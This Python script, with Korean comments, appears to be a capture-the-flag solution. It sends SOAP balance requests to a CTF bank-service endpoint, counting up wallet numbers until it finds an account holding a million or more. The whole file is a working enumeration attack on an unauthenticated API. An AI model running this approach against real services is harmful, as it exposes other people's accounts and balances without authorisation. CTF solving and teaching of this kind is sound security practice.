import urllib
import requests
from bs4 import BeautifulSoup

s = requests.session()     #세션 시작

def findM(count):
	url="http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/api/bankservice.php"
	headers = {'content-type': 'application/soap+xml'}
	body = """<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope 
   xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
   <SOAP-ENV:Body>
    <requestBalance>
        <wallet_num>"""+str(count)+"""</wallet_num>
    </requestBalance>
   </SOAP-ENV:Body>
</SOAP-ENV:Envelope>"""    #데이터가 들어가는 body영역에 SOAP 인젝션 코드 작성, count를 증가시켜 계정 확인

	res = s.post(url,data=body,headers=headers)
	soup = BeautifulSoup(res.text, "html.parser")
	str2 = soup.select("status")    #html출력 태그에 해당하는 부분 입력
	
	for a in str2:
		name = a.string    #리스트로 각각 들어가는 수를 변수에 저장
		goods = 1          #NoneType에 해당하는 계정에 대한 값 
		if name is not None:    #NoneType은 형변환이 불가능하기 때문에 예외처리
			good = ''.join(str(e) for e in name)
			goods = int(name)
	return goods

count = 1370   #계정 ID 시작부분 0~1300 까지 NoneType으로 아무겄도 없음

while 1:
	result = findM(count)
	print(result)
	if result >= 1000000:   #계정에 있는 금액이 1,000,000 이상이면 출력시키고 종료
		print("id = "+str(count)+" , money = "+str(result))
		exit(0)
	count += 1